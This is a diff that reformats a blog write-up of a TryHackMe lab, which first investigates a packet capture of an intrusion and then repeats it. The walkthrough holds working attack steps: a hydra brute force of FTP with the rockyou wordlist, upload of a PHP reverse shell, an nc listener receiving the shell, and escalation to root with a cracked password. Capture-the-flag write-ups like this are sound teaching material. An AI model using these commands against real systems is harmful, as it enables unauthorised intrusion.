@@ -6,14 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="hacked.png" width=200 alt="hacked">
+{{< post-img src="hacked.png" alt="hacked" style="width: 200px;" >}}
 
-Hey! how are yo doing? 
-
+Hey! how are yo doing?
 We are usually on the red side, trying to hack machines
-
 But today we doing blue stuff
-
 Investigating a pcap file to catch a hacker
 
 ## Analysis
@@ -21,34 +18,24 @@ Investigating a pcap file to catch a hacker
 we open `Capture.pcapng` with your favorite tool
 
 I go with `wireshark`
-
 Just read a bit and you already understand someone is trying to `ftp` as `jenny`
-
 Might be bruteforcing with `hydra`
-
 Follow the tcp stream on successful login to get the password `password123`
-
 He was in `/var/www/html` then made a http get request for `/shell.php`
-
 the file can be read after `ftp-data` filter is applied
+obviously its from [pentestmonkeys](http://pentestmonkey.net/tools/php-reverse-shell)!
 
-obviously its from [pentestmonkeys](http://pentestmonkey.net/tools/php-reverse-shell)! 
-
-I dumped the file content as printable text in a txt file for readabilty
+I dumped the file content as printable text in a txt file for readability
 
 Now its time to follow the tcp stream again and get his actions inside `wir3`
+he spawned a more comfortable shell with the good ol'
 
-he spawnned a more comfortable shell with the good ol'
-
-```
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-
 ```
 
-then used `whoami` then `sudo su` like a boss 
-
+then used `whoami` then `sudo su` like a boss
 jenny got too many privileges for someone using such a weak password
-
 My man cloned a badass backdoor from project [Reptile](git clone https://github.com/f0rb1dd3n/Reptile.git)
 
 Just read about it!
@@ -58,12 +45,10 @@ Now its time to do better than the attacker
 ## Getting Access
 
 he obviously changed the password so we can't just ssh as jenny (duh)
-
 so we have to re-do everything
-
 we can directly get into the hydra cracking
 
-```
+```bash
 └──╼ $hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.100.132/
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -78,12 +63,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-01 17:33:
 [ERROR] 13 targets did not resolve or could not be connected
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-01 17:34:51
-
 ```
 
 He is doing better than jenny at least
 
-```
+```bash
 └──╼ $ftp 10.10.100.132
 Connected to 10.10.100.132.
 220 Hello FTP World!
@@ -93,13 +77,11 @@ Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-
 ```
 
 Updated his own shell to serve us as `shell2.php`
 
-```
-
+```bash
 ftp> put /h4cked/shell2.php shell2.php
 local: /h4cked/shell2.php remote: shell2.php
 227 Entering Passive Mode (10,10,100,132,140,101)
@@ -118,7 +100,7 @@ ftp> chmod 777 shell2.php
 
 We are in too! Now Get that TTY!
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 43016
@@ -130,14 +112,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@wir3:/$
-
 ```
 
 ## privilege escalation
 
 Now we do the good ol' switcheroo
 
-```
+```bash
 www-data@wir3:/home/jenny$ su jenny
 su jenny
 Password: 987654321
@@ -146,14 +127,12 @@ jenny@wir3:~$ sudo su
 sudo su
 [sudo] password for jenny: 987654321
 
-root@wir3:/home/jenny# 
-
-
+root@wir3:/home/jenny#
 ```
 
 Get the flag
 
-```
+```bash
 root@wir3:/home/jenny# cd /root
 cd /root
 root@wir3:~# ls
@@ -170,4 +149,4 @@ cat flag.txt
 straight_to_jail_intruder
 ```
 
-Nice,simple, easy room!
+Nice, simple, fun easy room!
